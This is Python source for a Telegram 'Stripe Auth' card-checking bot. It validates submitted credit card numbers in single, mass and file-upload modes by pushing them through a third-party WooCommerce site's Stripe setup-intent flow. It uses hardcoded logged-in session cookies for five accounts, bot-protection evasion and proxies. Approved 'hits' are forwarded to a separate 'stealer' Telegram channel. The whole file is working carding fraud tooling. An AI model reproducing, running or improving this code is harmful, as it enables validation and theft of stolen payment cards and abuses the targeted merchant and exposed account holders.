import time
import asyncio
import re
import os
import random
import uuid
import cloudscraper
import requests
from pyrogram import Client, filters, enums
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from BOT.tools.hit_stealer import send_hit_if_approved

# -------------------------------------------------------------
# Configuration
# -------------------------------------------------------------
GATE_NAME = "Stripe Auth"
MAX_MSC_LIMIT = 10
MAX_TSC_LIMIT = 100

OWNER_DM = "https://t.me/spid_3r"
SYMBOL = f"<a href='{OWNER_DM}'>㊕</a>"
STEALER_CHANNEL_ID = -1003627495953

# -------------------------------------------------------------
# Account pool (5 accounts from original script)
# -------------------------------------------------------------
ACCOUNT_POOL = [
    {
        'name': 'Xray Xlea',
        'cookies': {
            '_ga': 'GA1.2.493930677.1768140612',
            '__stripe_mid': '66285028-f520-443b-9655-daf7134b8b855e5f16',
            'wordpress_logged_in_9f53720c758e9816a2dcc8ca08e321a9': 'xrayxlea%7C1769350388%7CxGcUPPOJgEHPSWiTK6F9YZpA6v4AgHki1B2Hxp0Zah5%7C3b8f3e6911e25ea6cccc48a4a0be35ed25e0479c9e90ccd2f16aa41cac04277d',
            'wfwaf-authcookie-69aad1faf32f3793e60643cdfdc85e58': '7670%7Cother%7Cread%7Cb723e85c048d2147e793e6640d861ae4f4fddd513abc1315f99355cf7d2bc455',
            '__cf_bm': 'rd1MFUeDPNtBzTZMChisPSRIJpZKLlo5dgif0o.e_Xw-1769258154-1.0.1.1-zhaKFI8L0JrFcuTzj.N9OkQvBuz6HvNmFFKCSqfn_gE2EF3GD65KuZoLGPuEhRyVwkKakMr_mcjUehEY1mO9Kb9PKq1x5XN41eXwXQavNyk',
            '__stripe_sid': '4f84200c-3b60-4204-bbe8-adc3286adebca426c8',
        }
    },
    {
        'name': 'Yasin Akbulut',
        'cookies': {
            '__cf_bm': 'zMehglRiFuX3lzj170gpYo3waDHipSMK0DXxfB63wlk-1769340288-1.0.1.1-ppt5LELQNDnJzFl1hN13LWwuQx5ZFdMS9b0SP4A3j7kasxaqEBMgSJ3vu9AbzyFOlbCozpAr.hE.g3xFpU_juaLp1heupyxmSrmte1Gn7g0',
            'wordpress_logged_in_9f53720c758e9816a2dcc8ca08e321a9': 'akbulutyasin836%7C1770549977%7CwdF5vz1qFXPSxofozNx9OwxFdmIoSdQKxaHlkOkjL2o%7C4d5f40c1bf01e0ccd6a59fdf08eb8f5aeb609c05d4d19fe41419a82433ffc1fa',
            '__stripe_mid': '2d2e501a-542d-4635-98ec-e9b2ebe26b4c9ac02a',
            '__stripe_sid': 'b2c6855b-7d29-4675-8fe4-b5c4797045132b8dea',
            'wfwaf-authcookie-69aad1faf32f3793e60643cdfdc85e58': '8214%7Cother%7Cread%7Cde5fd05c6afc735d5df323de21ff23f598bb5e1893cb9a7de451b7a8d50dc782',
        }
    },
    {
        'name': 'Mehmet Demir',
        'cookies': {
            '__cf_bm': 'zMehglRiFuX3lzj170gpYo3waDHipSMK0DXxfB63wlk-1769340288-1.0.1.1-ppt5LELQNDnJzFl1hN13LWwuQx5ZFdMS9b0SP4A3j7kasxaqEBMgSJ3vu9AbzyFOlbCozpAr.hE.g3xFpU_juaLp1heupyxmSrmte1Gn7g0',
            'wordpress_logged_in_9f53720c758e9816a2dcc8ca08e321a9': 'akbulutyasin836%7C1770549977%7CwdF5vz1qFXPSxofozNx9OwxFdmIoSdQKxaHlkOkjL2o%7C4d5f40c1bf01e0ccd6a59fdf08eb8f5aeb609c05d4d19fe41419a82433ffc1fa',
            '__stripe_mid': '2d2e501a-542d-4635-98ec-e9b2ebe26b4c9ac02a',
            '__stripe_sid': 'b2c6855b-7d29-4675-8fe4-b5c4797045132b8dea',
            'sbjs_migrations': '1418474375998%3D1',
        }
    },
    {
        'name': 'Ahmet Aksoy',
        'cookies': {
            '__cf_bm': 'aidh4Te7pipYMK.tLzhoGhXGelOgYCnYQJ525DEIqNM-1769341631-1.0.1.1-HSRHKAbOct2k1bbWIIdIN7b5fzWFydAtRqz2W0pAdRXrbVusNthJCJvU5fc7d3RkZEOZ5ZXZghJ4J2jmYzIcdJGDbb90txn4HPgSKJ6neA8',
            '_ga': 'GA1.2.1596026899.1769341671',
            '_gid': 'GA1.2.776441.1769341671',
            '__stripe_mid': '1b0100cd-503c-4665-b43b-3f5eb8b4edcdaae8bd',
            '__stripe_sid': '0f1ce17f-f7a9-4d26-bd37-52d402d30d1a8716bf',
            'wordpress_logged_in_9f53720c758e9816a2dcc8ca08e321a9': 'ahmetaksoy2345%7C1770551236%7CGF3svY4oh1UiTMXJ9iUXXuXtimHSG6PHiW0Sm5wrDbt%7Ce810ede4e1743cd73dc8dacdd56598ecf4ceaa383052d9b50d1bbd6c02da7237',
            'wfwaf-authcookie-69aad1faf32f3793e60643cdfdc85e58': '8216%7Cother%7Cread%7C70f37e1a77141c049acd75715a8d1aef6d47b285656c907c79392a55e787d97e',
        }
    },
    {
        'name': 'Dlallah',
        'cookies': {
            '__cf_bm': 'nwW.aCdcJXW8SAKZYpmEuqU6gCsNM1ibgP9mNKqXuYw-1769341811-1.0.1.1-hkeF4QihuQfbJD7DRqQcILcMycgxTqxxHcqwsU6oR8WsdViGcVMbX0CHqmx76N8wUEuIQwLFooNTm2gjGrRCKlURh4vf1ghD3gkz18KjyWg',
            '__stripe_mid': 'c7368749-b4fc-4876-bb97-bc07cc8a36b5851848',
            '__stripe_sid': 'b9d4dfb2-bba4-4ee6-9c72-8acf6acfe138efd65d',
            '_ga': 'GA1.2.1162515809.1769341851',
            'wordpress_logged_in_9f53720c758e9816a2dcc8ca08e321a9': 'dlallah%7C1770551422%7CiMfIpOcXTEo2Y9rmVMf3Mpf0kpkC4An81IgT0ZfMLff%7C01fbc5549954aa84d4f1b6c62bc44ebe65df58be0b82014d1b246c220d361231',
            'wfwaf-authcookie-69aad1faf32f3793e60643cdfdc85e58': '8217%7Cother%7Cread%7C24531823e5d32b0ad918bef860997fced3f0b92cce7ba200e3a753e050b546d3',
        }
    }
]

ULTRA_HEADERS = {
    'authority': 'associationsmanagement.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'accept-language': 'en-US,en;q=0.9',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}

def get_bin_info(n):
    n = n.replace(" ", "")[:8]
    apis = [
        f"https://lookup.binlist.net/{n}",
        f"https://data.handyapi.com/bin/{n[:6]}",
        f"https://api.bincheck.io/bin/{n[:6]}",
        f"https://projectsloth.io/bin/{n[:6]}",
        f"https://fayderal.site/api/bin/{n[:6]}"
    ]
    for api in apis:
        try:
            r = requests.get(api, timeout=4)
            if r.status_code == 200:
                data = r.json()
                brand = (data.get('scheme') or data.get('brand') or 'N/A').upper()
                bank = (data.get('bank', {}).get('name') or data.get('Bank') or 'N/A').upper()
                country = (data.get('country', {}).get('name') or 'N/A').upper()
                emoji = data.get('country', {}).get('emoji') or '🏳️'
                return f"{brand} | {bank} | {country} {emoji}"
        except:
            continue
    return "BIN INFO NOT FOUND"

def stripe_engine_sync(card_line, proxy=None):
    """Synchronous Stripe Auth – returns (status, message, bin_meta)"""
    try:
        n, mm, yy, cvc = [x.strip() for x in card_line.split('|')]
        yy = f"20{yy[-2:]}" if len(yy) <= 2 else yy
        acc = random.choice(ACCOUNT_POOL)
        bin_meta = get_bin_info(n)

        scraper = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'android', 'mobile': True})
        if proxy and len(proxy) > 5:
            scraper.proxies.update({"http": f"http://{proxy}", "https": f"http://{proxy}"})

        scraper.cookies.update(acc['cookies'])
        scraper.headers.update(ULTRA_HEADERS)

        # 1. Page to get pk_live and nonce
        r_page = scraper.get("https://associationsmanagement.com/my-account/add-payment-method/", timeout=25)
        pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', r_page.text)
        if not pk_match:
            return "Error", "Failed to extract Stripe public key", bin_meta
        pk_live = pk_match.group(0)

        nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"([a-z0-9]+)"', r_page.text)
        if not nonce_match:
            return "Error", "Failed to extract nonce", bin_meta
        addnonce = nonce_match.group(1)

        time.sleep(random.uniform(2.5, 3.5))

        # 2. Create payment method
        stripe_hd = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': ULTRA_HEADERS['user-agent'],
        }

        stripe_payload = (
            f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}'
            f'&billing_details[name]={acc["name"].replace(" ", "+")}'
            f'&billing_details[address][postal_code]=10001'
            f'&key={pk_live}'
            f'&muid={acc["cookies"].get("__stripe_mid", str(uuid.uuid4()))}'
            f'&sid={acc["cookies"].get("__stripe_sid", str(uuid.uuid4()))}'
            f'&guid={str(uuid.uuid4())}'
            f'&payment_user_agent=stripe.js%2F8f77e26090%3B+stripe-js-v3%2F8f77e26090%3B+checkout'
            f'&time_on_page={random.randint(90000, 150000)}'
        )

        r_stripe_req = scraper.post('https://api.stripe.com/v1/payment_methods', headers=stripe_hd, data=stripe_payload)
        r_stripe = r_stripe_req.json()

        if 'id' not in r_stripe:
            err = r_stripe.get('error', {}).get('message', 'Radar Security Block')
            return "Declined ❌", err[:50], bin_meta

        pm_id = r_stripe['id']

        # 3. Final Ajax call
        ajax_data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': addnonce,
        }
        r_ajax = scraper.post('https://associationsmanagement.com/wp-admin/admin-ajax.php', data=ajax_data, timeout=20).text

        if '"success":true' in r_ajax.lower() or 'insufficient_funds' in r_ajax.lower():
            return "Approved ✅", "Setup intent succeeded", bin_meta
        if 'incorrect_cvc' in r_ajax.lower():
            return "Approved ✅", "CVC matched", bin_meta

        reason = re.search(r'message\":\"(.*?)\"', r_ajax)
        error_msg = reason.group(1) if reason else "Unknown decline"
        return "Declined ❌", error_msg[:50], bin_meta

    except Exception as e:
        return "Error", str(e)[:50], "BIN info failed"

# -------------------------------------------------------------
# Stealer function
# -------------------------------------------------------------
async def send_hit_to_stealer(client, fullcc, status, response, gateway, time_taken, first_name, role):
    try:
        stealer_msg = f"""✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗛𝗜𝗧 ✅

{SYMBOL} 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {gateway}
{SYMBOL} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response}

{SYMBOL} 𝗧𝗼𝗼ᴋ {time_taken:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
        await client.send_message(chat_id=STEALER_CHANNEL_ID, text=stealer_msg, parse_mode="HTML", reply_markup=None)
    except Exception as e:
        print(f"[Stealer Error] {e}")

# -------------------------------------------------------------
# Async wrapper
# -------------------------------------------------------------
async def call_stripe_auth_api(fullcc):
    loop = asyncio.get_running_loop()
    status, msg, bin_meta = await loop.run_in_executor(None, stripe_engine_sync, fullcc, None)
    return status, msg, bin_meta

def extract_cards(text):
    return re.findall(r"\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}", text)

# -------------------------------------------------------------
# SINGLE CHECK COMMAND (/sra)
# -------------------------------------------------------------
@Client.on_message(filters.command("sra", [".", "/"]))
async def stripe_auth_single(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        getcc = await getmessage(message)
        if not getcc:
            resp = f"""✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
◈ <b>ᴄᴍᴅ :</b> /sra

⟢ ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ɪɴᴘᴜᴛ ✗

↪ <b>ᴜꜱᴀɢᴇ :</b> /sra cc|mm|yyyy|cvv
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return

        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
        gateway = GATE_NAME

        firstresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ. ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■□□□"""
        firstchk = await message.reply_text(firstresp, quote=True, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

        secondresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ.. ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■□"""
        secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

        start = time.perf_counter()
        status, response, bin_meta = await call_stripe_auth_api(fullcc)

        getbin = await get_bin_details(cc)
        brand, type_, level, bank, country, flag, currency = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5], getbin[6]

        thirdresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ... ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤ɴꜱᴇ -» ■■■■"""
        thirdcheck = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

        if "Approved" in status:
            await send_hit_to_stealer(Client, fullcc, status, response, gateway, time.perf_counter() - start, first_name, role)

        display_status = f"<b>{status}</b>"

        finalresp = f"""{display_status}

{SYMBOL} 𝗖𝗖 ⇾ <code>{fullcc}</code>
{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {gateway}
{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {response}

{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {brand}_{type_}-{level}
{SYMBOL} 𝗕ᴀɴᴋ: {bank}
{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {country} {flag}

{SYMBOL} 𝗧ᴏᴏᴋ {time.perf_counter() - start:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""

        await Client.edit_message_text(message.chat.id, thirdcheck.id, finalresp, disable_web_page_preview=True, parse_mode=enums.ParseMode.HTML)
        await setantispamtime(user_id)
        await deductcredit(user_id)

    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# -------------------------------------------------------------
# MASS CHECK (text/reply) (/msra)
# -------------------------------------------------------------
@Client.on_message(filters.command("msra", [".", "/"]))
async def stripe_auth_mass(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        ccs = []
        if message.reply_to_message:
            reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
            ccs = extract_cards(reply_text)
        else:
            text_parts = message.text.split(maxsplit=1)
            if len(text_parts) > 1:
                ccs = extract_cards(text_parts[1])

        if not ccs:
            resp = f"""✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
◈ <b>ᴄᴍᴅ :</b> /msra

⟢ ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ɪɴᴘᴜᴛ ✗

↪ <b>ᴜꜱᴀɢᴇ :</b> Reply to cards or /msra cc|mm|yyyy|cvv (up to {MAX_MSC_LIMIT})
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return

        if len(ccs) > MAX_MSC_LIMIT:
            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_MSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True)
            ccs = ccs[:MAX_MSC_LIMIT]

        await process_sequential_check(Client, message, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# -------------------------------------------------------------
# TXT FILE COMMAND (/tsra)
# -------------------------------------------------------------
@Client.on_message(filters.command("tsra", [".", "/"]))
async def stripe_auth_txt(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        target_message = None
        if message.reply_to_message and message.reply_to_message.document:
            target_message = message.reply_to_message
        elif message.document:
            target_message = message

        if not target_message or not target_message.document.file_name.endswith(".txt"):
            resp = f"""✦ <b>ɴᴏ ꜰɪʟᴇ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
◈ <b>ᴄᴍᴅ :</b> /tsra

⟢ ᴜᴘʟᴏᴀᴅ ᴀ .ᴛxᴛ ꜰɪʟᴇ ᴏʀ ʀᴇᴘʟʏ ᴛᴏ ᴏɴᴇ (up to {MAX_TSC_LIMIT})
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return

        file_path = await Client.download_media(target_message)
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
            ccs = extract_cards(content)
        os.remove(file_path)

        if not ccs:
            await message.reply("✦ ɴᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅꜱ ꜰᴏᴜɴᴅ ɪɴ ꜰɪʟᴇ ✗ ✦", quote=True)
            return

        if len(ccs) > MAX_TSC_LIMIT:
            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_TSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True)
            ccs = ccs[:MAX_TSC_LIMIT]

        await process_sequential_check(Client, message, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# -------------------------------------------------------------
# SEQUENTIAL PROCESSING
# -------------------------------------------------------------
async def process_sequential_check(Client, message, ccs, user_id, first_name, role):
    total_cards = len(ccs)
    processed = 0
    approved_count = 0
    declined_count = 0
    gateway = GATE_NAME
    start_time = time.perf_counter()
    approved_cards = []

    progress_text = f"""Stripe Auth
Admin

{SYMBOL} Response: Starting...

Progress: 0/{total_cards}
Approved ✅: 0
Declined ❌: 0
Remaining: {total_cards}

Checked by: {first_name} ({role})"""
    progress_msg = await message.reply(progress_text, quote=True, parse_mode=enums.ParseMode.HTML)

    for idx, fullcc in enumerate(ccs, 1):
        processed = idx
        remaining = total_cards - processed
        status, response, bin_meta = await call_stripe_auth_api(fullcc)

        cc_num = fullcc.split('|')[0]
        getbin = await get_bin_details(cc_num)
        brand = getbin[0] if len(getbin) > 0 else "Unknown"
        type_ = getbin[1] if len(getbin) > 1 else "Unknown"
        level = getbin[2] if len(getbin) > 2 else "Unknown"
        bank = getbin[3] if len(getbin) > 3 else "Unknown"
        country = getbin[4] if len(getbin) > 4 else "Unknown"
        flag = getbin[5] if len(getbin) > 5 else ""

        if "Approved" in status or "✅" in status:
            approved_count += 1
            response_status = "APPROVED ✅"
            card_time = time.perf_counter() - start_time
            approved_cards.append({
                "fullcc": fullcc, "status": status, "response": response, "gateway": gateway,
                "brand": f"{brand}_{type_}-{level}", "bank": bank, "country": country, "flag": flag, "time": card_time
            })
            await send_hit_to_stealer(Client, fullcc, status, response, gateway, card_time, first_name, role)
        else:
            declined_count += 1
            response_status = "DECLINED ❌"

        try:
            await Client.edit_message_text(message.chat.id, progress_msg.id,
                f"""Stripe Auth
Admin

{SYMBOL} Response: {response_status}

Progress: {processed}/{total_cards}
Approved ✅: {approved_count}
Declined ❌: {declined_count}
Remaining: {remaining}

Checked by: {first_name} ({role})""", parse_mode=enums.ParseMode.HTML)
        except:
            pass
        await asyncio.sleep(0.5)

    await progress_msg.delete()

    for card in approved_cards:
        display_status = f"<b>{card['status']}</b>"
        approved_msg = f"""{display_status}

{SYMBOL} 𝗖𝗖 ⇾ <code>{card['fullcc']}</code>
{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {card['gateway']}
{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {card['response']}

{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {card['brand']}
{SYMBOL} 𝗕ᴀɴᴋ: {card['bank']}
{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {card['country']} {card['flag']}

{SYMBOL} 𝗧ᴏᴏᴋ {card['time']:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""
        await message.reply_text(approved_msg, quote=True, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

    elapsed_time = round(time.perf_counter() - start_time, 2)

    if approved_count > 0:
        declined_summary = f"""❌ 𝗗𝗲𝗰𝗹ɪɴᴇᴅ 𝗖ᴀʀᴅ𝘀 ({declined_count})

━━━━━━━━━━━━━━━━━━━━
"""
        declined_list = [cc for cc in ccs if cc not in [c['fullcc'] for c in approved_cards]]
        for card in declined_list[:15]:
            declined_summary += f"{SYMBOL} {card} → Declined\n"
        if declined_count > 15:
            declined_summary += f"\n... and {declined_count - 15} more declined cards"
        declined_summary += f"""
━━━━━━━━━━━━━━━━━━━━
✅ Approved: {approved_count}
❌ Declined: {declined_count}
📊 Total: {total_cards}
⏱ Time: {elapsed_time}s
👤 Checked by: {first_name} ({role})"""
        await message.reply_text(declined_summary, quote=True, parse_mode=enums.ParseMode.HTML)
    else:
        await message.reply_text(
            f"""❌ 𝗡ᴏ 𝗔ᴘᴘʀᴏᴠᴇᴅ 𝗖ᴀʀᴅ𝘀

━━━━━━━━━━━━━━━━━━━━
📊 Total Cards: {total_cards}
❌ All Declined: {declined_count}
⏱ Time: {elapsed_time}s
👤 Checked by: {first_name} ({role})""",
            quote=True, parse_mode=enums.ParseMode.HTML
        )

    await setantispamtime(user_id)
